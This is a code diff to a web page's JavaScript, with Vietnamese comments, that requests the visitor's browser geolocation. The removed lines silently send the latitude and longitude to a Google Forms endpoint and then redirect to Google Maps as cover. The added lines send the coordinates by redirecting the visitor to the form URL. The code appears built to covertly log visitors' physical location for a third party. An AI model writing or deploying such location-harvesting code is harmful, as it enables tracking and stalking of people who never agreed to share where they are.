@@ -14,19 +14,16 @@
         }
 
         function showPosition(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            document.getElementById("location").innerHTML = "Vị trí của bạn: " + latitude + ", " + longitude;
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
 
-            // Gửi vị trí đến Google Forms
-            var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScHfGegs79vFl5uDlv8x2BTJVw-pFp2zZzbNTRZBJCJXOw3nQ/formResponse?";
-            var fullURL = formURL + "entry.6288103361519107001=" + latitude + "," + longitude;
-            fetch(fullURL, { mode: 'no-cors' });
+    // URL của Google Forms
+    var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScHfGegs79vFl5uDlv8x2BTJVw-pFp2zZzbNTRZBJCJXOw3nQ/formResponse?";
+    var fullURL = formURL + "entry.6288103361519107001=" + latitude + "," + longitude;
 
-            // Chuyển hướng đến Google Maps
-            window.location.href = "https://www.google.com/maps?q=" + latitude + "," + longitude;
-        }
-
+    // Tự động mở Google Forms để lưu dữ liệu
+    window.location.href = fullURL;
+}
         function showError(error) {
             switch (error.code) {
                 case error.PERMISSION_DENIED:
